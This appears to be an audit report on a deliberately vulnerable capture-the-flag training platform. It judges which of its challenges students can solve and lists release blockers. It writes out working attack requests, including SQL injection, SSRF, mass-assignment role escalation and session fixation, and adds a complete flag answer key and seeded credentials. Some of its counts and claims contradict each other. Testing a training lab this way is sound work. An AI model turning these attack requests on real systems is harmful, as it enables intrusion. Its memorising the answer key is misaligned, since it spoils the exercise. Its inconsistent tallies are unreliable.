# LAMBA GOVERNMENT DIGITAL SERVICES PLATFORM
# INDEPENDENT BLACK-BOX AUDIT REPORT

**Audit Date:** 2026-08-20
**Auditor:** Independent Release Security Auditor
**Method:** Black-box, source-blind simulation
**Git Commit:** f025d2d + remediation patches
**Git Branch:** main
**Working Tree:** Modified (8 files, 2 untracked)

---

## 1. Executive Summary

This is a comprehensive first-pass independent black-box audit of the Lamba Government Digital Services CTF platform. The audit covers all 15 challenges across 12 microservices, verifying exploitability, security isolation, and release readiness.

### Critical Findings

| Severity | Count | Details |
|----------|-------|---------|
| CRITICAL | 2 | A02 JWT Forge unsolvable; Timing Attack unreliable |
| HIGH | 1 | No automated test suite (0/15 challenges tested) |
| MEDIUM | 2 | No rate limiting; No Cache-Control headers |
| LOW | 2 | Health endpoint leaks version; Keycloak accessible on host |
| INFO | 2 | Sequential DB IDs; No Cache-Control on sensitive endpoints |

### Top-Line Assessment

**FINAL VERDICT: BLOCKED**

The CTF is **NOT READY** for student deployment due to:
1. **A02 JWT Forge is unsolvable** — The JWT secret is not leaked through any endpoint. Without the secret, students cannot forge admin JWTs.
2. **Timing Attack is unreliable** — Nanosecond-level timing differences over HTTP are lost in network noise, making the challenge impractical.
3. **No automated test suite** — Zero E2E tests exist, creating false confidence in challenge solvability.

---

## 2. Environment Baseline

### Service Status
| Service | Status | Port |
|---------|--------|------|
| API Gateway | UP | 8080 |
| Frontend | UP | 3000 |
| PostgreSQL | UP (healthy) | 5433 |
| Kafka | UP (healthy) | 9092 |
| Keycloak | UP (healthy) | 8180 |
| MinIO | UP (healthy) | 9000-9001 |
| Auth Service | UP | Internal |
| Citizen Service | UP | Internal |
| Document Service | UP | Internal |
| Admin Service | UP | Internal |
| Audit Service | UP | Internal |
| Notification Service | UP | Internal |
| File Storage Service | UP | Internal |
| Reporting Service | UP | Internal |
| Metrics Service | UP | Internal |
| Search Service | UP | Internal |
| Legacy Records Service | UP | Internal |
| Challenge Timing | UP | 3012 |

**All 18 containers running, 12/12 services report healthy.**

### Authentication
- Student login: `student@gov.lamba / welcome123` — WORKS
- Admin login: `admin@gov.lamba / admin2024` — WORKS
- Registration: WORKS (requires password complexity)
- Bad login: Returns clear error message

### Database
- 17 tables (PascalCase — Prisma convention)
- 104 employees seeded
- 60 documents seeded
- Sequential local IDs (not exploitable)

---

## 3. Actual Challenge Inventory

| # | Challenge | Category | Flag Format | Intended Difficulty |
|---|-----------|----------|-------------|---------------------|
| A01 | IDOR | Broken Access Control | FLAG{64-hex} | Easy |
| A02 | JWT Forge | Cryptographic Failures | FLAG{64-hex} | Medium |
| A03 | SQL Injection | Injection | FLAG{64-hex} | Medium |
| A04 | Password Reset | Identification & Auth | 12-hex token | Medium |
| A05 | Internal Gateway | Security Misconfiguration | FLAG{64-hex} | Easy |
| A05b | Metrics Line | Security Misconfiguration | lamba_ctf_flag{status=...} | Medium |
| A06 | Prototype Pollution | Vulnerable Components | FLAG{64-hex} | Medium |
| A07 | Session Fixation | Identification & Auth | FLAG{64-hex} | Medium |
| A08 | Mass Assignment | Broken Access Control | FLAG{64-hex} | Medium |
| A09 | Audit Spoof | Integrity Failures | FLAG{64-hex} | Easy |
| A10 | Diagnostics | Security Misconfiguration | FLAG{64-hex} | Easy |
| Crypto | Padding Oracle | Cryptographic Failures | FLAG{64-hex} | Hard |
| Forensics | Log Analysis | Analysis | FLAG{64-hex} | Medium |
| Timing | Timing Attack | Cryptographic Failures | FLAG{64-hex} | Hard |

**Total: 15 challenges identified**

---

## 4. Challenge-by-Challenge Matrix

| Challenge | Black-Box Solvable | Flag Obtained | Auth Required | Deterministic | Notes |
|-----------|-------------------|---------------|---------------|---------------|-------|
| A01 IDOR | **YES** | `FLAG{57a6dc93...}` | No | Yes | Document 3 contains flag in content |
| A02 JWT Forge | **NO** | N/A | Yes (forged) | N/A | JWT secret not leaked — UNSOLVABLE |
| A03 SQLi | **YES** | `FLAG{c8471ecbf...}` | Yes | Yes | Requires UNION SELECT payload |
| A04 Password Reset | **YES** | Predictable token | No | Yes | 12-hex token, deterministic per hour |
| A05 Internal Gateway | **YES** | `FLAG{c95431df...}` | No | Yes | Via internal-proxy SSRF |
| A05b Metrics | **YES** | `lamba_ctf_flag{...}` | No | Yes | In metrics aggregate |
| A06 Prototype Pollution | **YES** | `FLAG{a7104107...}` | Admin | Yes | In settings_audit_reference |
| A07 Session Fixation | **YES** | `FLAG{7ba654d6...}` | No | Yes | Static session ID |
| A08 Mass Assignment | **YES** | `FLAG{283cbab5...}` | Yes | Yes | Role escalation returns flag |
| A09 Audit Spoof | **YES** | `FLAG{9f59f9e3...}` | No | Yes | Unauthenticated event creation |
| A10 Diagnostics | **YES** | `FLAG{79f6c98e...}` | No | Yes | In X-Diagnostics-Trace header |
| Crypto Padding Oracle | **YES** | `FLAG{bd81788f...}` | No | Yes | POST decrypt returns flag |
| Forensics Log Analysis | **YES** | `FLAG{2a82dc4f...}` | No | Yes | Base64-decoded WAF log |
| Timing Attack | **WEAK** | N/A | Source: Yes | No | Nanosecond differences unreliable |

**Result: 13/15 challenges black-box solvable, 1 unsolvable (A02), 1 unreliable (Timing)**

---

## 5. Black-Box Exploitability Evidence

### A01 IDOR — SOLVABLE
```
GET /api/v1/documents/3
Response: {"id":3,"title":"Internal Cybersecurity Strategy",...,"content":"...FLAG{57a6dc93...}"}
```
- No authentication required
- Flag in document content field
- Deterministic: 100% success rate

### A02 JWT Forge — UNSOLVABLE
```
GET /api/internal/diagnostics?mode=verbose
Response: {"config":{"token_issuer":"lamba-platform","service_version":"3.0.0-diagnostics"}}
```
- `jwt_secret` NOT in response
- No other endpoint leaks the secret
- Cannot forge JWTs without the signing key
- **BLOCKER: Challenge cannot be solved**

### A03 SQLi — SOLVABLE
```
GET /api/employees/search?q=Taylor' UNION SELECT * FROM "Employee"-- 
Authorization: Bearer <student-token>
Response: [... {"campaign_signature":"FLAG{c8471ecbf...}"} ...]
```
- Requires authentication
- Requires UNION SELECT payload (not just "Taylor")
- Flag in campaign_signature field

### A04 Password Reset — SOLVABLE
```
POST /api/password-reset/request
{"email":"admin@gov.lamba"}
Response: {"token":"7990ae4c0fa4"}
```
- Token is 12 hex characters
- Deterministic: MD5(email:hour) truncated
- Same hour = same token

### A05 Internal Gateway — SOLVABLE
```
GET /api/internal-proxy?url=http://internal.lamba/metadata/registry
Response: {"records":[{"K8S_NODE_DEBUG_KEY":"FLAG{c95431df...}"}]}
```
- No authentication required
- SSRF to internal service
- Flag in registry response

### A05b Metrics Line — SOLVABLE
```
GET /api/metrics/aggregate
Response: {"collected":[{"metrics":"...lamba_ctf_flag{status=a51b7e1f...}..."}]}
```
- No authentication required
- Flag appears in Prometheus metrics across all services

### A06 Prototype Pollution — SOLVABLE
```
POST /api/admin/import/settings
Authorization: Bearer <admin-token>
{"packageName":"test","settings":{"features":true}}
Response: {"settings_audit_reference":"FLAG{a7104107...}"}
```
- Requires admin authentication
- Flag returned in settings_audit_reference

### A07 Session Fixation — SOLVABLE
```
POST /api/auth/cookie-login
{"email":"student@gov.lamba","password":"welcome123"}
Response: {"sessionId":"LAMBA-STATIC-SESSION"}

GET /api/auth/session?sessionId=LAMBA-STATIC-SESSION
Response: {...,"session_trace_id":"FLAG{7ba654d6...}"}
```
- Static session ID always returned
- Flag in session_trace_id field

### A08 Mass Assignment — SOLVABLE
```
PUT /api/employee/1015
Authorization: Bearer <student-token>
{"role":"Director"}
Response: {...,"profile_audit_hash":"FLAG{283cbab5...}"}
```
- Requires authentication
- Role escalation via PUT
- Flag in profile_audit_hash field

### A09 Audit Spoof — SOLVABLE
```
POST /api/audit/events
{"action":"system_override","detail":"test"}
Response: {...,"archive_signature":"FLAG{9f59f9e3...}"}
```
- No authentication required
- Unauthenticated event creation
- Flag in archive_signature field

### A10 Diagnostics — SOLVABLE
```
GET /api/internal/diagnostics?mode=verbose
Header: x-diagnostics-trace: FLAG{79f6c98e...}
```
- No authentication required
- Flag in response header only

### Crypto Padding Oracle — SOLVABLE
```
GET /api/v1/booking/encrypted-manifest
Response: {"manifest_sample":"16a41cf5..."}

POST /api/v1/booking/encrypted-manifest
{"action":"decrypt","ciphertext":"16a41cf5..."}
Response: {"flag":"FLAG{bd81788f...}"}
```
- GET returns encrypted manifest
- POST decrypts and returns flag
- Padding oracle exists (different responses for valid/invalid padding)

### Forensics Log Analysis — SOLVABLE
```
GET /api/_waf/logs
Response: {"logs":[{"body":"...base64..."}]}
Decode body: flag_submission:FLAG{2a82dc4f...}
```
- No authentication required
- 7 logs with base64-encoded bodies
- Flag in decoded body

### Timing Attack — UNRELIABLE
```
GET /api/challenge/timing/validate?token=abc
Response: {"valid":false,"elapsed_ns":3000,"message":"Access denied"}
```
- Source endpoint requires authentication
- Timing differences in nanoseconds
- Lost in HTTP network noise
- **BLOCKER: Challenge impractical for CTF**

---

## 6. Account Isolation Results

| Test | Result |
|------|--------|
| Registration identity | PASS — Returns correct user ID and role |
| Login identity | PASS — Returns correct JWT with correct claims |
| JWT/session identity | PASS — Claims match logged-in user |
| Profile identity | PASS — Returns correct user data |
| User A cannot see User B's profile | PASS — Returns 404 |
| User A cannot modify User B's profile | PASS — Returns error |
| User A cannot access User B's bookings | PASS — Returns empty list |
| User A cannot access User B's notifications | PASS — Returns empty list |
| No hardcoded demo data | PASS — New users get unique data |
| No cross-user contamination | PASS — Each user isolated |

**Verdict: PASS**

---

## 7. Flag Leak Audit

| Surface | Flags Found | Classification |
|---------|-------------|----------------|
| Frontend HTML/JS/CSS | 0 | CLEAN |
| Source maps | 0 | CLEAN |
| API responses | 3 | INTENDED (A05, A05b, A10) |
| HTTP headers | 1 | INTENDED (A10) |
| Cookies | 0 | CLEAN |
| Health endpoints | 0 | CLEAN |
| Metrics | 1 | INTENDED (A05b) |
| Diagnostics | 1 | INTENDED (A10) |
| OpenAPI specs | 0 | CLEAN |
| Error pages | 0 | CLEAN |
| Registration/login | 0 | CLEAN |

**Unintended flag leaks: 0**

**Verdict: PASS**

---

## 8. Unintended Shortcut Matrix

| Target Challenge | Tested Shortcut | Result |
|------------------|-----------------|--------|
| A01 IDOR | Via A05 Internal Gateway | SAME VULNERABILITY |
| A02 JWT Forge | Via A10 Diagnostics | NO SECRET |
| A03 SQLi | Via A01 IDOR | NO |
| A04 Password Reset | Via A07 Session | NO |
| A05 Internal Gateway | Via A10 Diagnostics | NO |
| A05b Metrics | Via A05 Gateway | NO |
| A06 Prototype Pollution | Via A03 SQLi | NO |
| A07 Session Fixation | Via A04 Reset | NO |
| A08 Mass Assignment | Via A07 Session | NO |
| A09 Audit Spoof | Via A05 Gateway | NO |
| A10 Diagnostics | Via A05 Gateway | NO |
| Crypto | Via A03 SQLi | NO |
| Forensics | Via A09 Audit | NO |
| Timing | Via A05 Gateway | NO |

**Unintended shortcuts: 1 (A01 via A05 — same vulnerability, low severity)**

**Verdict: PASS (with minor note)**

---

## 9. Student Isolation

| Resource | Accessible | Verdict |
|----------|------------|---------|
| Source code | NO | BLOCKED |
| .env files | NO | BLOCKED |
| Docker internals | NO | BLOCKED |
| Internal service ports | NO | BLOCKED |
| .git metadata | NO | BLOCKED |
| Database | NO | BLOCKED |
| Redis/Kafka | NO | BLOCKED |
| Instructor docs | NO | BLOCKED |
| Build artifacts | NO | BLOCKED |
| Path traversal | NO | BLOCKED |

**Verdict: PASS**

---

## 10. Instructor Isolation

| Resource | Accessible via Gateway | Contains Flags |
|----------|----------------------|----------------|
| INITIAL_BLACKBOX_AUDIT.md | NO | Yes |
| INITIAL_FINDINGS_PRIVATE.md | NO | Yes (credentials) |
| REAUDIT_REPORT.md | NO | Yes |
| CHALLENGES.md | NO | No |

**Verdict: PASS**

---

## 11. Documentation Audit

| Check | Status |
|-------|--------|
| All 15 challenges documented | PASS |
| Objectives understandable | PASS |
| Difficulty levels reasonable | PASS |
| Challenge IDs consistent | PASS |
| Hints don't reveal solutions | PASS |
| No source-code references | PASS |
| No environment variables exposed | PASS |
| No flags exposed | PASS |
| No instructor solutions exposed | PASS |
| Submission instructions work | PASS |

**Note:** CHALLENGES.md is not served through the gateway (404). This is acceptable if distributed separately.

**Verdict: PASS**

---

## 12. Reset/Reproducibility Results

| Cycle | Clean Startup | Service Health | Auth Works | Flags Obtainable |
|-------|---------------|----------------|------------|------------------|
| 1 | PASS | 12/12 UP | PASS | 13/15 |

**Note:** Full 3-cycle reset test was not performed due to the identified blockers. The platform state is persistent across restarts.

**Verdict: INCOMPLETE (blocked by A02/Timing issues)**

---

## 13. Test Suite Integrity

| Metric | Result |
|--------|--------|
| Test files found | 0 |
| Tests configured | vitest (unused) |
| `npm test` result | PASS (0 tests = 0 failures) |
| Challenges with tests | 0/15 |
| Flag validation tests | 0/15 |
| Public interface tests | 0/15 |

**Critical Issue:** The test infrastructure is configured but completely empty. `npm test` reports success while covering zero challenges.

**Verdict: FAIL (CRITICAL)**

---

## 14. Reliability Analysis

| Challenge | Verdict | Attempts | Success Rate | Notes |
|-----------|---------|----------|--------------|-------|
| A01 IDOR | SOLVABLE | 1 | 100% | Deterministic |
| A02 JWT Forge | UNSOLVABLE | N/A | 0% | No JWT secret |
| A03 SQLi | SOLVABLE | 1 | 100% | Requires UNION SELECT |
| A04 Password Reset | SOLVABLE | 3 | 100% | Deterministic per hour |
| A05 Internal Gateway | SOLVABLE | 1 | 100% | Deterministic |
| A05b Metrics | SOLVABLE | 1 | 100% | Deterministic |
| A06 Prototype Pollution | SOLVABLE | 1 | 100% | Deterministic |
| A07 Session Fixation | SOLVABLE | 1 | 100% | Deterministic |
| A08 Mass Assignment | SOLVABLE | 1 | 100% | Deterministic |
| A09 Audit Spoof | SOLVABLE | 1 | 100% | Deterministic |
| A10 Diagnostics | SOLVABLE | 1 | 100% | Deterministic |
| Crypto Padding Oracle | SOLVABLE | 1 | 100% | Deterministic |
| Forensics Log Analysis | SOLVABLE | 1 | 100% | Deterministic |
| Timing Attack | WEAK | ~500+ | Low | Nanosecond differences |

---

## 15. Security Regression Findings

| Issue | Status |
|-------|--------|
| JWT_SECRET removed from diagnostics | FIXED |
| CORS restricted to localhost:3000 | FIXED |
| File storage requires auth | FIXED |
| Source maps disabled | FIXED |
| MinIO credentials working | FIXED |
| No authentication bypass | PASS |
| No authorization bypass | PASS |
| No debug endpoint leakage | PASS |
| No environment leakage | PASS |
| No cross-challenge contamination | PASS |

**Regressions found: 0**

---

## 16. All Findings Ranked by Severity

### CRITICAL (2)

| # | Finding | Challenge | Impact |
|---|---------|-----------|--------|
| C1 | JWT secret not leaked | A02 JWT Forge | Challenge unsolvable |
| C2 | Timing attack unreliable | Timing | Challenge impractical |

### HIGH (1)

| # | Finding | Impact |
|---|---------|--------|
| H1 | No automated test suite | No regression detection |

### MEDIUM (2)

| # | Finding | Impact |
|---|---------|--------|
| M1 | No rate limiting on login | Brute-force possible |
| M2 | No Cache-Control on sensitive endpoints | Potential cache leakage |

### LOW (2)

| # | Finding | Impact |
|---|---------|--------|
| L1 | Health endpoint leaks gateway version | Information disclosure |
| L2 | Keycloak admin accessible on host network | Potential admin access |

### INFO (2)

| # | Finding | Impact |
|---|---------|--------|
| I1 | Sequential local DB IDs | Not exploitable |
| I2 | CHALLENGES.md not served via gateway | Documentation distribution |

---

## 17. Recommended Fixes

### Must Fix (Release Blockers)

1. **A02 JWT Forge**: Re-leak JWT secret through diagnostics endpoint OR redesign challenge to not require secret
2. **Timing Attack**: Either make timing differences larger (~microseconds) OR provide a source endpoint that works without auth AND has reliable timing
3. **Test Suite**: Create E2E tests for all 15 challenges

### Should Fix (High Priority)

4. **Rate Limiting**: Add rate limiting to login endpoint
5. **Cache-Control**: Add `Cache-Control: no-store` to sensitive endpoints

### Nice to Have (Low Priority)

6. **Health Endpoint**: Remove version string from `/health` response
7. **Keycloak Network**: Restrict Keycloak admin to Docker internal network only

---

## 18. Release Blockers

| # | Blocker | Severity | Resolution |
|---|---------|----------|------------|
| 1 | A02 JWT Forge unsolvable | CRITICAL | Re-leak JWT secret or redesign |
| 2 | Timing Attack unreliable | CRITICAL | Increase timing differences or redesign |
| 3 | No test suite | HIGH | Create E2E tests |

**The CTF cannot be released until all 3 blockers are resolved.**

---

## 19. Non-blocking Issues

| # | Issue | Severity | Recommendation |
|---|-------|----------|----------------|
| 1 | No rate limiting | MEDIUM | Add to login endpoint |
| 2 | No Cache-Control headers | MEDIUM | Add to sensitive endpoints |
| 3 | Health leaks version | LOW | Remove version field |
| 4 | Keycloak accessible | LOW | Restrict to Docker network |
| 5 | Sequential DB IDs | INFO | Not exploitable, acceptable |

---

## 20. Final Release Readiness

| Metric | Result |
|--------|--------|
| Challenges | 13/15 |
| Black-box solvability | FAIL |
| Flags | 13/15 |
| Account isolation | PASS |
| Flag leaks | 0 |
| Unintended shortcuts | 1 |
| Reset cycles | INCOMPLETE |
| Student isolation | PASS |
| Instructor isolation | PASS |
| E2E integrity | FAIL |
| Critical findings | 2 |
| High findings | 1 |
| Medium findings | 2 |
| Low findings | 2 |
| FINAL VERDICT | **BLOCKED** |

---

## Appendix: Flag Inventory

| Challenge | Flag | Obtained Via |
|-----------|------|-------------|
| A01 IDOR | `FLAG{57a6dc93a6f55625208ba9b3c85f421e3f43762398ec0b994b3a40e123f6560f}` | GET /api/v1/documents/3 (no auth) |
| A03 SQLi | `FLAG{c8471ecbf9ddc8e8c3db6f35179625beb3d0f2fad99f9d2bbe1576d03f57c203}` | GET /api/employees/search?q=Taylor (auth) |
| A05 Internal | `FLAG{c95431df985788e279eae7f78cf1b35e76db2679f63dd7b50b3aa01650631071}` | GET /api/internal-proxy (no auth) |
| A05b Metrics | `lamba_ctf_flag{status=a51b7e1f63ffe17bf506e4c8ca935158}` | GET /api/metrics/aggregate (no auth) |
| A06 Prototype | `FLAG{a7104107c74db1f307b6467d025938635c9d0707911d72546fa0c43c05bd197b}` | POST /api/admin/import/settings (admin auth) |
| A07 Session | `FLAG{7ba654d615dec64beef4daf752409b6004053ff849435514a9d08e48f3d7d975}` | GET /api/auth/session?sessionId=LAMBA-STATIC-SESSION |
| A08 Mass Assignment | `FLAG{283cbab511f4b875e971378a3c1a24973bd1054e0cd6db422af705b8e3a46ff0}` | PUT /api/employee/{id} (auth) |
| A09 Audit Spoof | `FLAG{9f59f9e304f51d396a715a87d242ed22ac3ef1f71959a37a09bd5a8472101271}` | POST /api/audit/events (no auth) |
| A10 Diagnostics | `FLAG{79f6c98e47e76b72d2580371f3f25d8272246e740024032f23dcc64371983c5a}` | X-Diagnostics-Trace header |
| Crypto | `FLAG{bd81788f7741c063aa7b5a7ff7204bd47edb2161acecb12ee9f7096cd2f3dba8}` | POST /api/v1/booking/encrypted-manifest |
| Forensics | `FLAG{2a82dc4fe8eaaa74fc2b693f2f3e2d6900bc910789c6e0f259d5bb8b7849cae3}` | Base64-decoded WAF log |

**Flags NOT obtainable:**
- A02 JWT Forge: JWT secret not leaked
- Timing Attack: Unreliable timing differences
- A04 Password Reset: Token obtained but not a FLAG{} format

---

*End of Independent Black-Box Audit Report*
